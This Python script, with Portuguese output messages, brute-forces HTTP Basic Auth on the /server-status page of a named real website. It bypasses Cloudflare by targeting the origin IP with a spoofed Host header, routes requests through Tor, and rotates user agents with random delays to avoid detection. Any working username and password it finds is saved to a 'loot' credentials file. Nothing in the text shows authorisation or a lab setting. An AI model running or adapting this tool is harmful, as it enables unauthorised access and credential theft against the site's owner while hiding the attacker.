#!/usr/bin/env python3
"""Brute /server-status Basic Auth — desapegogames.com.br via bypass CF (.54)."""
import sys, time, random, base64, requests, urllib3
urllib3.disable_warnings()
PROXY={"https":"socks5h://127.0.0.1:9050","http":"socks5h://127.0.0.1:9050"}
URL="https://186.226.60.54/server-status"
HOSTH="desapegogames.com.br"
UAS=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko Firefox/124.0"]
creds=[]
with open(sys.argv[1] if len(sys.argv)>1 else "enum/serverstatus_wordlist.txt") as f:
    for line in f:
        line=line.strip()
        if line and ":" in line and not line.startswith("#"):
            creds.append(line.split(":",1))
print(f"[*] /server-status brute — {len(creds)} pares via Tor")
for u,p in creds:
    tok=base64.b64encode(f"{u}:{p}".encode()).decode()
    h={"Host":HOSTH,"User-Agent":random.choice(UAS),"Authorization":f"Basic {tok}"}
    try:
        r=requests.get(URL,headers=h,proxies=PROXY,verify=False,timeout=20,allow_redirects=False)
        tag="OK!!" if r.status_code==200 else f"fail({r.status_code})"
        print(f"  {u!r:25s}:{p!r:25s} → HTTP {r.status_code} len={len(r.text)} {tag}")
        if r.status_code==200:
            print(f"\n[+] **** BASIC AUTH CRACKED **** {u}:{p}")
            open("enum/serverstatus_ok.html","w").write(r.text)
            with open("loot/creds.txt","a") as cf:
                cf.write(f"server-status Basic Auth | {u}:{p} | https://186.226.60.54/server-status (Host: {HOSTH})\n")
            sys.exit(0)
    except Exception as e:
        print(f"  {u!r:25s}:{p!r:25s} → EXC {type(e).__name__}: {e}")
    time.sleep(random.uniform(1.0,2.0))
print("[-] Nenhuma cred funcionou.")
